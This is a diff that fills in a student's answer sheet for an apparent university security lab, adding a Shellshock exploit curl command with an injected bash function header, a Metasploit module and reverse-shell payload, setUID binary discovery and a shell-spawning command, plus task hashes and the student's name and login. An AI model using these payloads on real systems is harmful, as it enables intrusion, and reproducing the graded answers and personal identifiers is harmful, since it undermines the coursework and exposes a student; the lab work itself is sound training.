@@ -16,8 +16,8 @@ Example:
   Your Name: Kyuhong Park
 
 -->
-  Your GT Login ID: 
-  Your Name: 
+  Your GT Login ID: gmanral3
+  Your Name: Gayatri Manral
 <--
 
 Task 1
@@ -28,7 +28,7 @@ Task 1
 Example:
   IP : 10.0.2.3
 -->
-  IP : 
+  IP : 10.0.2.4
 <--
 
 
@@ -38,7 +38,7 @@ Example:
   Port : 73
 
 -->
-  Port : 
+  Port : 80
 <--
 
 
@@ -51,14 +51,14 @@ Example:
   Command : curl http://10.0.2.1:6262/cgi-bin/shellshock.cgi
 
 -->
-  Command : 
+  Command : curl http://10.0.2.4:80/cgi-bin/shellshock.cgi   -H "custom:() { :; }; echo Content-Type: text/html; echo; /bin/task2 gmanral3"
 <--
 
 
 2. What hash value is returned by running ./bin/task2 with your student ID.
 
 -->
-  Hash : 
+  Hash : e6eb33bb4519622631fbe0aec0dab7e56613e380b3031077e10a68b8dd0053db
 <--
 
 
@@ -71,7 +71,7 @@ Example:
   Module : auxiliary/scanner/portscan/tcp
 
 -->
-  Module : 
+  Module : exploit/multi/http/apache_mod_cgi_bash_env_exec
 <--
 
 
@@ -81,14 +81,14 @@ Example:
   Payload : auxiliary/scanner/portscan/tcp
 
 -->
-  Payload : 
+  Payload : payload/linux/x86/shell_reverse_tcp  
 <--
 
 
 3. What hash value is returned by running ./bin/task3 with your student ID.
 
 -->
-  Hash : 
+  Hash : b4c1f3b3c010ebc4dd2db74e5c7a6fb9fcc6f5041aa15be3f5461ca6af3ae45e
 <--
 
 
@@ -101,7 +101,7 @@ Example:
   Command : find . php
 
 -->
-  Command : 
+  Command : find /usr/bin -perm 4755
 <--
 
 
@@ -111,14 +111,14 @@ Example:
   Program : passwd
 
 -->
-  Program : 
+  Program : su
 <--
 
 
 3. What command did you use to exploit the setUID vulnerability to spawn a shell.
 
 -->
-  Command : 
+  Command : /usr/bin/script -qc /bin/bash /dev/null
 <--
 
 
